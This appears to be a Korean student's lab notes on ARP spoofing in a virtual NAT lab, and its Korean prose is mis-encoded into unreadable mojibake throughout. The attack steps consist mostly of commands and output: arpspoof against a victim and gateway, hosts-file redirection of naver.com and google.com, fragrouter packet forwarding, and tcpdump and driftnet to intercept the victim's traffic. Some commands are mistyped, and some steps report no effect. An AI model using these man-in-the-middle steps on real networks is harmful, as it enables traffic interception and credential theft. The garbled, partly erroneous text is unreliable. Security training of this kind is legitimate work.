# ARP Spoofing

## ê°œìš”

- MAC Addressë¥¼ ì†ì—¬ LANì—ì„œì˜ í†µì‹  íë¦„ì„ ì™œê³¡ì‹œí‚¤ëŠ” ê¸°ë²•ì„ ë§í•œë‹¤.
- ARP í…Œì´ë¸”ì´ ë°”ë€Œë©´ ê²½ê³ ë¥¼ ë³´ë‚´ëŠ” íˆ´ì„ í†µí•´ ì–´ëŠ ì •ë„ëŠ” ì˜ˆë°©í•  ìˆ˜ ìˆì§€ë§Œ ê·¼ë³¸ì ìœ¼ë¡œ TCP/IP í”„ë¡œí† ì½œ ìì²´ì˜ ë¬¸ì œì´ê¸° ë•Œë¬¸ì— ARP Spoofingì— ëŒ€í•œ ë³´ì•ˆ ëŒ€ì±…ì€ ì—†ë‹¤.

### ARP í…Œì´ë¸”
- IPì£¼ì†Œì™€ í•´ë‹¹ ì£¼ì†Œì— ëŒ€í•œ MAC Address ëª©ë¡ì„ ë§í•œë‹¤.
- 'cmd'ì°½ì—ì„œ 'arp -a' ë¥¼ í†µí•´ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

## ì‹¤ìŠµ 1. ê¸°ë³¸ ì‹¤ìŠµ (IPë¥¼ ì´ìš©í•œ ê³µê²©)
### ğŸ–¥ï¸ ì‹¤ìŠµ í™˜ê²½(NAT)
```
- Attacker(Kali)        192.168.10.134 / c / 192.168.10.2 / 192.168.10.2
- Victim(Windows 10)    192.168.10.130 / c / 192.168.10.2 / 192.168.10.2
``` 

```
[samadal@kali ~]$ sudo ip link show eth0
[sudo] password for samadal:
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 00:0c:29:b2:04:58 brd ff:ff:ff:ff:ff:ff

[samadal@kali ~]$ sudo arp -a
_gateway (192.168.10.2) at 00:50:56:e0:28:a3 [ether] on eth0
? (192.168.10.1) at 00:50:56:c0:00:08 [ether] on eth0

[samadal@kali ~]$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.10.134  netmask 255.255.255.0  broadcast 192.168.10.255
        inet6 fe80::20c:29ff:feb2:458  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:b2:04:58  txqueuelen 1000  (Ethernet)
        RX packets 186  bytes 29318 (28.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 149  bytes 20777 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
kali            (192.168.10.134) / 00:0c:29:b2:04:58
Windows 10      (192.168.10.132) / 00-0C-29-BE-47-CB
G/W             (192.168.10.2)   / 00:50:56:e0:28:a3

```  
## ARP Spoofingì„ ì´ìš©í•œ MAC Address ë³€ê²½

```
sudo dsniff
```
```
sudo arpspoof -i eth0 -t 192.168.10.130 192.168.10.2
```
- ëª…ë ¹ì–´ ì‹¤í–‰ ì „
```
kali            (192.168.10.134) / 00:0c:29:b2:04:58
Windows 10      (192.168.10.132) / 00-0C-29-BE-47-CB
G/W             (192.168.10.2)   / 00:50:56:e0:28:a3
```
![ì „](./img/ìŠ¤í‘¸í•‘img/1.png)
- ëª…ë ¹ì–´ ì‹¤í–‰ í›„
```
kali            (192.168.10.134) / 00:0c:29:b2:04:58
Windows 10      (192.168.10.132) / 00-0C-29-BE-47-CB
G/W             (192.168.10.2)   / 00:0c:29:b2:04:58
```
![í›„](./img/ìŠ¤í‘¸í•‘img/2.png)

## ê²°ë¡ 
- ê³µê²©ì„ í•˜ê³  ìˆëŠ” ë™ì•ˆë§Œ MAC Addressê°€ ë³€ê²½ëœë‹¤.

## ì‹¤ìŠµ 2. ì‘ìš© ì‹¤ìŠµ 1.  (ë„ë©”ì¸ì„ ì´ìš©í•œ ê³µê²©)

### ê°œìš”
- CentOSì—ì„œ DNSì„œë²„ì™€ Web ì„œë²„ë¥¼ êµ¬ì¶•í•œë‹¤.
- Kaliì—ì„œ ARP Spoofing ê³µê²©ì„ ì‹œë„í•œë‹¤.
- Window 10ì—ì„œ ì‚¬ì´íŠ¸ ì¶œë ¥ì„ í™•ì¸í•˜ê³  ë³€ì¡°ëœ ê²ƒì„ í™•ì¸í•œë‹¤.

### ğŸ–¥ï¸ ì‹¤ìŠµ í™˜ê²½(NAT)
```
- Attacker(Kali)        192.168.10.134 / c / 192.168.10.2 / 192.168.10.132
- Victim(CentOS)        192.168.10.132 / c / 192.168.10.2 / 192.168.10.132
- í™•ì¸(Windows 10)       192.168.10.130 / c / 192.168.10.2 / 192.168.10.132
``` 

### Step 1. 3ê°œì˜ ì‹œìŠ¤í…œì— IPë¥¼ ì„¤ì •

### Step 2. CentOSì—ì„œ 'Kali'ì— í˜¸ìŠ¤íŠ¸ ë¶€ì—¬

### Step 3. windows 10ì—ì„œ ë„¤ì„ì„œë²„ ì¡°íšŒë¥¼ í•˜ê³  'MAC Address'ë¡œ í™•ì¸í•œë‹¤.

![í›„](./img/ìŠ¤í‘¸í•‘img/3.png)

### Step 4. Windows 10ì—ì„œ 'ì‚¬ì´íŠ¸(www.gusiya.com)'ë¥¼ ì¶œë ¥í•œë‹¤.

![í›„](./img/ìŠ¤í‘¸í•‘img/4.png)


### Step 5. 'kali'ì—ì„œ ì‹œìŠ¤í…œ ì¬êµ¬ì„±

- Apache2 íŒ¨í‚¤ì§€ ì„¤ì¹˜, ë°©í™”ë²½ ì¶”ê°€ í›„ í™œì„±í™”
<br>
```
[samadal@kali ~]$ sudo apt install apache2
apache2 is already the newest version (2.4.63-1).
apache2 set to manually installed.
Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1167
  

[samadal@kali ~]$ dpkg -l | grep apache2
ii  apache2                                 2.4.63-1                                 amd64        Apache HTTP Server
ii  apache2-bin                             2.4.63-1                                 amd64        Apache HTTP Server (modules and other binary files)
ii  apache2-data                            2.4.63-1                                 all          Apache HTTP Server (common files)
ii  apache2-utils                           2.4.63-1                                 amd64        Apache HTTP Server (utility programs for web servers)
ii  libapache2-mod-dnssd                    0.6-5                                    amd64        Zeroconf support for Apache 2 via avahi
ii  libapache2-mod-php                      2:8.4+96                                 all          server-side, HTML-embedded scripting language (Apache 2 module) (default)
ii  libapache2-mod-php8.4                   8.4.4-1
```
```
- ë°ëª¬ ì¬ì‹¤í–‰
    
    â†’ sudo service apache2 restart
    
- ë°©í™”ë²½ í™•ì¸
    
    â†’ sudo ufw status
```

- ì‚¬ì´íŠ¸ ì¶œë ¥ <br>
![í›„](./img/ìŠ¤í‘¸í•‘img/5.png)

### Step 6. 'Kali' ì—ì„œ 'DNS Spoofing'ìœ¼ë¡œ ë‘ ì‹œìŠ¤í…œì— ê³µê²©ì„ ì‹¤í–‰í•œë‹¤.
```
sudo arpspoof -i eth0 -t 192.168.10.130 192.168.10.2
```
- windows 10<br>

![í›„](./img/ìŠ¤í‘¸í•‘img/6.png)

â†’ ëª¨ë‘ ì •ìƒì ìœ¼ë¡œ ì¶œë ¥ì´ ëœë‹¤.<br>

â†’ ê·¸ ì´ìœ ëŠ” **'windows 10'** ë‹¨ì§€ ì‚¬ì´íŠ¸ë¥¼ ì¶œë ¥ë§Œ í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ì‹¤ì œ ê³µê²©ì„ ë°›ì•˜ì§€ë§Œ ì‚¬ì´íŠ¸ëŠ” ì•„ë¬´ëŸ° ì˜í–¥ì„ ë°›ì§€ ì•ŠëŠ”ë‹¤.<br>

```
sudo arpspoof -i eth0 -t 192.168.10.132 192.168.10.2
```
![í›„](./img/ìŠ¤í‘¸í•‘img/7.png) <br>
ì´ê²ƒë„ ë³€í™”ê°€ ì—†ë‹¤. <br>

![ì„¼í† ìŠ¤](./img/ìŠ¤í‘¸í•‘img/8.png) <br>
```
í˜„ì¬ arp -a ì¶œë ¥ì—ì„œ í™•ì¸ëœ ì‚¬í•­
192.168.10.2 (gateway) ì™€ 192.168.10.134 (attack.gusiya.com)ì´ ë™ì¼í•œ MAC ì£¼ì†Œ (00:0c:29:b2:04:58) ë¥¼ ê°€ì§.

ì´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ARP ìŠ¤í‘¸í•‘(ìœ„ì¡°) ë˜ëŠ” ARP í¬ì´ì¦ˆë‹ ê³µê²©ì˜ ì§•í›„ì…ë‹ˆë‹¤.
```
ë³€í™”

```bash
[samadal@kali ~]$ sudo cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

[samadal@kali ~]$

[samadal@kali ~]$ sudo cp -p /etc/hosts /etc/host.samadal
```

- /etc/hosts íŒŒì¼ ìˆ˜ì •

```bash
[samadal@kali ~]$ sudo vi /etc/hosts

[samadal@kali ~]$

[samadal@kali ~]$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.0.27    www.naver.com   ->ë‚´ hostOS IP ì…ë ¥ 
192.168.10.134  www.google.com
```
```
sudo arpspoof -i eth0 -t 192.168.10.132 192.168.10.2
```

```
[samadal@kali ~]$ sudo vi /etc/resolv.conf
[sudo] password for samadal:

[samadal@kali ~]$

[samadal@kali ~]$ sudo apt -y install fragrouter
```
ë‹¤ì‹œ resolve.conf ìˆ˜ì • í›„
```
[samadal@kali ~]$ sudo fragrouter -B1
fragrouter: base-1: normal IP forwarding
```
<br>

```
192.168.0.27 naver.com
192.168.10.134 google.com

[samadal@kali ~]$ sudo fragrouter -B1
fragrouter: base-1: normal IP forwarding
192.168.10.130.63314 > 8.8.8.8.53: udp 28
192.168.10.130.58844 > 8.8.8.8.53: udp 28


192.168.0.1 naver.com
192.168.10.134 google.com

[samadal@kali ~]$ sudo fragrouter -B1
fragrouter: base-1: normal IP forwarding
192.168.10.130.64830 > 8.8.8.8.53: udp 28
```
ì•„ë¬´ ë³€í™” ì—†ë‹¤ <br>

--- 
## ì‘ìš© ì‹¤ìŠµ 3. Packet Forwarding 2. GET

### ğŸ–¥ï¸ ì‹¤ìŠµ í™˜ê²½(NAT)
```
- Attacker(Kali)        192.168.10.134 / c / 192.168.10.2 / 192.168.10.2
- í™•ì¸(Windows 10)       192.168.10.130 / c / 192.168.10.2 / 8.8.8.8
``` 
## Step 1. 'Packet Forwarding'ì„ ìœ„í•œ í™˜ê²½ êµ¬ì„±
> í˜¸ìŠ¤íŠ¸ ë³€ê²½<br>

```
(kali) vi /etc/hosts
192.168.0.38 naver.com          -> Host OSì˜ IPì£¼ì†Œ
192.168.10.134 google.com       -> kaliì˜ IPì£¼ì†Œ
```
## Step 2. ARP Spoofing ëª…ë ¹ ì‹¤í–‰

> ìŠ¤í‘¸í•‘ì„ ë•Œë¦°ë‹¤
```
[samadal@kali ~]$ sudo arpspoof -i eth0 -t 192.168.10.130 192.168.10.2
0:c:29:b2:4:58 0:c:29:be:47:cb 0806 42: arp reply 192.168.10.2 is-at 0:c:29:b2:4:58
```
ì´ í™”ë©´ì€ ê·¸ëŒ€ë¡œ ë‘”ë‹¤.

## Step 3. 'Packet Forwarding'ëª…ë ¹ ì‹¤í–‰ (í™”ë©´ì´ ë©ˆì¶˜ê²ƒì²˜ëŸ¼ ë˜ì–´ ìˆì–´ë„ ì •ìƒ)

> ì‹ ê·œ í„°ë¯¸ë„ì°½ì€ í•˜ë‚˜ ë” ì—´ê³  ì‹¤í–‰ <br>
> í˜„ì¬ window10 ì£¼ì†Œ
```
C:\Users\Administrator>arp -a

ì¸í„°í˜ì´ìŠ¤: 192.168.10.130 --- 0x6
  ì¸í„°ë„· ì£¼ì†Œ           ë¬¼ë¦¬ì  ì£¼ì†Œ           ìœ í˜•
  192.168.10.2          00-50-56-e0-28-a3     ë™ì 
  192.168.10.255        ff-ff-ff-ff-ff-ff     ì •ì 
  224.0.0.22            01-00-5e-00-00-16     ì •ì 
  224.0.0.251           01-00-5e-00-00-fb     ì •ì 
  224.0.0.252           01-00-5e-00-00-fc     ì •ì 
```


- window10 ë§¥ì£¼ì†Œ ë³€í™”<br>
![ë³€í™”](./img/ìŠ¤í‘¸í•‘img/9.png)

```
[samadal@kali ~]$ sudo fragrouter -B1
```
ë§¥ì£¼ì†Œ ë³€í™” ì—†ìŒ

## ê²°ë¡ 
### ê³µê²©ëŒ€ìƒì— ARP Spoofingì„ ì‹¤í–‰í•œ í›„ **fragroute -B1** ë¥¼ í†µí•´ ê³µê²©ëŒ€ìƒì˜ ì›¹ ë¸Œë¼ìš°ì €ì— ì¶œë ¥ë˜ëŠ” ëª¨ë“  ë‚´ìš©ì„ ê³µê²©ëŒ€ìƒì˜ ê°€ìƒ í¬íŠ¸ë¥¼ ì´ìš©í•´ì„œ í™•ì¸ì´ ê°€ëŠ¥í•˜ë‹¤.


## ì‘ìš© ì‹¤ìŠµ 4. Packet Forwarding 3. POST

### ğŸ–¥ï¸ ì‹¤ìŠµ í™˜ê²½(NAT)
```
- Attacker(Kali)        192.168.10.134 / c / 192.168.10.2 / 192.168.10.132
- Victim(CentOS)        192.168.10.132 / c / x / x
- í™•ì¸(Windows 10)       192.168.10.130 / c / 192.168.10.2 / 192.168.10.132
``` 
![post](./img/ìŠ¤í‘¸í•‘img/11.png)
<br>
![post](./img/ìŠ¤í‘¸í•‘img/10.png)

## ì‘ìš©ì‹¤ìŠµ 5. íŒ¨í‚· ë¤í•‘ ë° ê°€ë¡œì±„ê¸°
### ğŸ–¥ï¸ ì‹¤ìŠµ í™˜ê²½(NAT)
```
- Attacker(Kali)        192.168.10.134 / c / 192.168.10.2 / 192.168.10.2
- í™•ì¸(Windows 10)       192.168.10.130 / c / 192.168.10.2 / 8.8.8.8
``` 

```
[samadal@kali ~]$ sudo driftnet -i eth0

(driftnet:5865): Gtk-WARNING **: 20:43:40.593: cannot open display:
```

Step 1. 'ARP Spoofing'ì„ ì´ìš©í•œ ê³µê²©ëŒ€ìƒ ì‹œìŠ¤í…œì˜ 'ARP ìºì‹œ ì •ë³´(G/W ì£¼ì†Œ)' ë³€ê²½
```
(kali)$ sudo arpspoof -i eth0 -t 192.168.10.130 192.168.10.2
```

Step 2. íŒ¨í‚· í¬ì›Œë”© ì„¤ì •
```
(kali)$ sudo fragrouter -B1
```

Step3. íŒí”„ ë° ê°€ë¡œ ì±„ê¸°
```
(kali)$ sudo tcp dump src192.168.10.130 and prot 80 
(kali)$ sudo driftnet -t eth0
```